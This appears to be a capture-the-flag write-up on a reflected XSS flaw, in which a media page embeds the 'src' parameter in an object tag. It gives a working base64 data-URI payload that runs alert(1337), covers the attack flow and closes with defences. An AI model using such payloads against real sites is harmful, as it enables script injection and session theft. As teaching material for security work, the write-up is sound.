# XSS via Media Object Vulnerability Report

## What I Found

In this one we have an XSS vulnerability.

## How I Discovered It

In the home page, we can find out that it's possible to navigate by clicking on the NASA image to:
`http://{ip}/?page=media&src=nsa`

By navigating the page and analyzing, we can find out that the website uses an `<object>` tag to embed media resources to the page. This media is retrieved based on the query parameter, e.g., "nsa".

## Data URI Scheme Research

By doing some research on [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data), we can find out how we can embed different things inside our website using the data URI scheme:

### Data URI Format
```
data:[<media-type>][;base64],<data>
```

### Examples of Data URI Usage
- **Text/HTML:** `data:text/html,<h1>Hello World</h1>`
- **Base64 encoded HTML:** `data:text/html;base64,PGgxPkhlbGxvIFdvcmxkPC9oMT4=`
- **JavaScript:** `data:text/html,<script>alert('XSS')</script>`
- **Images:** `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==`
- **CSS:** `data:text/css,body{background:red;}`

## The Attack

Finally, we can get the flag by visiting:
```
http://{ip}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==
```

### What This Payload Does

1. **Base64 Decoding:** The base64 string `PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==` decodes to: `<script>alert(1337)</script>`

2. **XSS Execution:** When the website embeds this data URI into an `<object>` tag, it executes the JavaScript code

3. **Complete Attack Flow:**
   - User visits the malicious URL
   - Website takes the `src` parameter value
   - Embeds it into: `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="></object>`
   - Browser processes the data URI and executes the JavaScript
   - `alert(1337)` popup appears, proving XSS

## Why This is Dangerous

- **Script Execution:** Attackers can run arbitrary JavaScript in the victim's browser
- **Session Hijacking:** Can steal cookies and session tokens
- **Data Theft:** Can access sensitive information on the page
- **Phishing:** Can modify page content to trick users
- **Redirection:** Can redirect users to malicious websites

## How to Prevent This

1. **Input Validation:** Validate and sanitize the `src` parameter
2. **Whitelist Allowed Sources:** Only allow specific, trusted media sources
3. **Content Security Policy (CSP):** Implement CSP headers to block inline scripts
6. **URL Validation:** Validate that URLs point to expected domains/resources